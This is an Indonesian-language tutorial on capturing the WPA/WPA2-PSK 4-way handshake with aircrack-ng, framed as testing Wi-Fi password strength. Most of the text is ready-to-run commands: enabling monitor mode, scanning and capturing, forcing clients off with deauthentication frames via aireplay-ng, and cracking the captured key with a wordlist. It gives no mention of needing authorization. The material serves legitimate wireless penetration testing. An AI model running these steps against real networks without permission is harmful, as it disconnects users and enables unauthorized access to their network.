# Capture 4-Way Handshake

Capture 4-Way Handshake adalah teknik yang digunakan untuk menguji keamanan jaringan Wi-Fi WPA/WPA2-PSK dengan cara menangkap proses autentikasi 4-Way Handshake antara client dan access point (AP) yang terjadi saat client terhubung ke jaringan Wi-Fi. Handshake yang berhasil ditangkap dapat digunakan untuk melakukan serangan offline guna menguji kekuatan password Wi-Fi, seperti dictionary attack, brute-force attack, atau Pre-Computed PMK.

## Persyaratan
- Linux
- Adapter Wi‑Fi (mendukung mode monitor)
- Koneksi internet
  
## Instal Tools

```
apt-get update
apt-get install aircrack-ng
```

## Langkah-Langkah

#### 1. Aktifkan Mode Monitor

```
airmon-ng check kill
airmon-ng start [interface]
```

#### 2. Scan Wi-Fi WPA/WPA2-PSK

```
airodump-ng --encrypt wpa [interface]
```

#### 3. Capture Handshake

```
airodump-ng --bssid [bssid] --channel [channel] --write [output] [interface]
```

#### 4. Jalankan Serangan Deauth

```
aireplay-ng -0 10 -a [bssid] [interface]
```

#### 5. Crack Kunci WPA/WPA2-PSK

```
aircrack-ng -a 2 [file_capture] -w [wordlist]
```
